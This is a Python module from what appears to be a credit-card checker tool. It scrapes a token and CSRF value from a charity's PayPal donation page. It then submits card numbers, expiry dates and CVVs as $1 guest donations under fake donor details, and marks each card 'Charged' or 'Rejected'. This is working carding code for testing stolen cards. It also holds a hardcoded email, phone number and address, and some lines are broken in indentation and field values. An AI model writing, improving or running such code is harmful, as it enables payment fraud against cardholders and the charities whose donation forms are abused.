import os
from .rand_user import random_user_api
from ..filters.checker_defs import find_between, remove_html_tags




def one(r):
    url = 'https://www.paypal.com/donate/?cmd=_s-xclick&hosted_button_id=M3ZF6FGQWHQHG'
        headers = {
        'authority': 'www.paypal.com',
    'method': 'GET',
    'path': '/donate/?cmd=_s-xclick&hosted_button_id=M3ZF6FGQWHQHG',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'referer': 'https://friends-imu.org/',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'
    }
    resp = r.post(url=url, headers=headers)
    token = find_between(resp.text, 'token=', '&')
    csrf = find_between(resp.text, 'donate" data-csrf="', '"')
    return False if False else token, csrf


def two(r,token, csrf, cc,mes,ano,cvv):
    if cc.startswith('5'):
        type = 'Mastercard'
    if cc.startswith('5'):
        image = 'ccMC'
    if cc.startswith('5'):
        type1 = 'master_card'
    if cc.startswith('4'):
        type = 'Visa'
    if cc.startswith('4'):
        image = 'ccVisa'
    if cc.startswith('4'):
        type1 = 'visa'
    if cc.startswith('3'):
        type = 'American Exxpress'
    if cc.startswith('3'):
        type1 = 'amex'
    if cc.startswith('3'):
        image = 'ccAmex'
    if cc.startswith('6'):
        type = 'Discover'
    if cc.startswith('6'):
        type1 = 'discover'
    if cc.startswith('6'):
        image = 'ccDiscover'
    if ano.startswith('20'):
        ano1 = ano[-2:]
        a_data = {
        "amount": 1,
        "symbol": "$",
        "code": "USD",
        "note": "",
        "country": "US",
        "languageSelectorState": True,
        "cardSpec": {
            "cardSpec": {
                "name": type,
                "type": type1,
                "fields": {
                    "ccNumber": {
                        "required": True,
                        "editable": False,
                        "pattern": "[0-9]+",
                        "autodetect": "(5[1-5]\\d*|(222[1-8][0-9]{2}|2229[0-8][0-9]|22299[0-9]|22[3-9][0-9]{3}|2[3-6][0-9]{4}|27[01][0-9]{3}|2720[0-8][0-9]|27209[0-9])\\d*)",
                        "maxlength": 16
                    },
                    "expirationDate": {
                        "required": True,
                        "pattern": "(0[1-9]|1[012])[/]((20)[0-9]{2}|[0-9]{2})",
                        "maxlength": 7
                    },
                    "csc": {
                        "required": True,
                        "pattern": "[0-9]*",
                        "maxlength": 3
                    }
                },
                "logoUrl": f"https://www.paypalobjects.com/en_US/i/logo/{image}.gif"
            }
        },
        "user": {
            "firstName": "martin",
            "lastName": "York",
            "email": "roldexlncaster@gmail.com",
            "password": "",
            "occupation": None,
            "nationality": None,
            "dateOfBirth": None,
            "countryOfResidence": "",
            "legalValid": None,
            "consentCommunication": False
        },
        "card": {
            "number": cc,
            "securityCode": cvv,
            "expiration": f"{mes}/{ano1}",
            "expiryMonth": ano,
            "expiryYear": ano
        },
        "phone": {
            "type": "Mobile",
            "number": "2259383093",
            "countryCode": "1"
        },
        "consentShareAddress": False,
        "billingAddress": {
            "line1": "3 allen street",
            "city": "New York",
            "postalCode": "10002",
            "postcode": "10002",
            "country": "US",
            "state": "NY"
        },
        "giftAidItFlag": False,
        "token": "o6KmbpdfsG4QNaafpHMvjoJXfgmezlkuhtXoC7GumtDZ_UGbz84yqCdT5le-ToI2W6gb3Qd-_Le3yEaq",
        "createaccount": False,
        "serverErrors": [],
        "email": "roldexlncaster@gmail.com",
        "isNna": False
    }

    a_headers = {
        'authority': 'www.paypal.com',
        'method': 'POST',
        'path': '/donate/guest',
        'scheme': 'https',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'content-length': '1396',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://www.paypal.com',
        'referer': f'https://www.paypal.com/donate/guest?token={token}',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
        'x-csrf-token': csrf,
        'x-requested-with': 'XMLHttpRequest',
    }

    res = r.post('https://www.paypal.com/donate/guest', json = a_data, headers= a_headers)
    if res.status_code != 200: return False
    jso = res.json()
    status = jso['status'] if 'status' in jso else None
    code = jso['code'] if 'code' in jso else None

    if status == 'error':
        r_text1 = code if code else "DECLINED"
        r_text, r_logo, r_respo = r_text1, "❌", 'Rejected'
    elif status == 'success':
        r_text, r_logo, r_respo = "Charged $1", "✅", 'Charged'
    else:
        r_text, r_logo, r_respo = "Error", "❌", 'Rejected'
    return r_text.replace('_', ' '), r_logo, r_respo
        